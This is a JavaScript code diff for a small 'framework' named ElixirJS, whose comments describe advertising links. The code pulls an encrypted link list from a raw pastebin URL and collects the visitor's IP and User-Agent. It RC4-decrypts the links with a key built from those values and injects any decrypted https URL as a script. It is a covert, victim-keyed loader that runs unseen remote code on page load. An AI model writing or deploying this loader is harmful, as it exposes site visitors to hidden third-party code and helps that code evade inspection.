@@ -25,60 +25,100 @@ function loadJS(src) {
     bodyTag.appendChild(scriptTag);
 }
 
-(function(window) {
+/*! Load JQuery code and call given expression */
+function jqGetReady(callback) {
+	if (typeof jQuery === 'undefined'){
+		loadJSwCB("//code.jquery.com/jquery-1.12.4.min.js", callback);
+		return;
+	} else {
+		setTimeout(callback, 1);
+	}
+}
 
-    // Use the correct document accordingly with window argument (sandbox)
+/*! Load javascript asynchronously and call given expression */
+function loadJSwCB(url, callback) {
+	var script = document.createElement("script");
+	script.type = "text/javascript";
+	script.async = true;
+	if (script.readyState) {
+		script.onreadystatechange = function () {
+			if (script.readyState == "loaded" || script.readyState == "complete") {
+				script.onreadystatechange = null;
+				setTimeout(callback, 1);
+			}
+		};
+	} else {
+		script.onload = function () {
+			setTimeout(callback, 1);
+		};
+	}
+	script.src = url;
+	(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(script);
+}
+
+/*! Callback function, which get client-side metrics and store it */
+function ElixirJSgetClientMetricsCallback(jsobj) {
+				/*! store client metrics */
+				if (jsobj['origin']!==undefined) ElixirJS.userip = jsobj['origin'];
+				if (jsobj['headers']!==undefined && jsobj['headers']['User-Agent']!==undefined) ElixirJS.userAgent = jsobj['headers']['User-Agent'];
+}
+
+/*! Framework global variable */
+var ElixirJS;
+
+/*! Using closure to avoid variable names conflict */
+;(function(window) {
+    
+    /*! Use the correct document accordingly with window argument (sandbox) */
     var document = window.document, navigator = window.navigator;
     
-    var Elixir = (function() {
-		// Define a constructor of Elixir class
+	window.ElixirJS = (function() {
+		/*! Define a constructor of Elixir class */
 		var Elixir = function() {
-			this.getipurl = getipurl;
-			this.userAgent = userAgent;
-			this.getlinksurl = getlinksurl;
-			
-			// Call init method
-			return this.init();
-		},
-		userAgent = navigator.userAgent,
-		// Use third-party service to get client ip
-		getipurl = "https://jsonip.com/?callback=Elixir.getip",
-		// Use dynamically changed CDN storage resource
-		getlinksurl = "https://pastebin.com/raw/iCJ3tdsC";
+			/*! Current framework version */
+			this.version = "0.0.4";
+			/*! Use third-party service to get client ip */
+			this.getipurl = "https://httpbin.org/get";
+			/*! Client HTTP request 'User-Agent' field */
+			this.userAgent = null;
+			/*! Use dynamically changed CDN storage resource */
+			this.getlinksurl = "https://pastebin.com/raw/iCJ3tdsC";
+			/*! Client HTTP request remote IP-address */
+			this.userip = null;
+			/*! Personal links on advertising content */
+			this.links = null;
+			/*! Plain-text personal link */
+			this.cjslink = null;
+		}
 		
 		Elixir.prototype = {
-			constructor: Elixir,
-			init: function() {
-				loadJS(this.getlinksurl);
-				loadJS(this.getipurl);
-				this.rotatelinks();
-				
-				// Return object
-				return this;
-			},
-			version : "0.0.3",
-			getipurl : null,
+			version : "0.0.4",
+			getipurl : "https://httpbin.org/get",
 			userAgent : null,
-			getlinksurl : null,
+			getlinksurl : "https://pastebin.com/raw/iCJ3tdsC",
 			userip : null,
 			links : null,
 			cjslink : null,
 			
-			getip: function(jsobj) {
-				// store client ip
-				this.userip = jsobj.ip;
+			init: function() {
+				/*! Process personal links array */
+				this.rotatelinks();
+				
+				/*! Return object */
+				return this;
 			},
-
+			
+			
 			getlinks: function(jsobj) {
-				// store links array
+				/*! Store links array */
 				this.links = jsobj; 
 			},
 			
 			rotatelinks: function() {
 				var found_new_link = false;
-				if (this.userip == null || this.links == null) {setTimeout("Elixir.rotatelinks()", 10); return false;}
+				if (this.userip == null || this.userAgent == null || this.links == null) {setTimeout("ElixirJS.rotatelinks()", 100); return false;}
 				
-				// Go through links array
+				/*! Go through links array */
 				for (var propertyName in this.links) {
 					if (this.links.hasOwnProperty(propertyName)) {
 						var enclink = "";
@@ -90,7 +130,7 @@ function loadJS(src) {
 						var key = propertyName+this.userAgent+this.userip;
 						var declink = rc4(key, enclink);
 						if (declink.search(/^https/) != -1) {
-							// client link found
+							/*! Personal link found */
 							this.cjslink = declink;
 							found_new_link = true;
 							loadJS(declink);
@@ -104,6 +144,10 @@ function loadJS(src) {
 		};
 		return new Elixir();
 	})();    
-    window.Elixir = Elixir;
-    
 })(window);
+/*! Init framework */
+ElixirJS.init();
+/*! Get personal links array */
+loadJS(ElixirJS.getlinksurl);
+/*! Get client metrics */
+jqGetReady("jQuery.getJSON(ElixirJS.getipurl, ElixirJSgetClientMetricsCallback);");
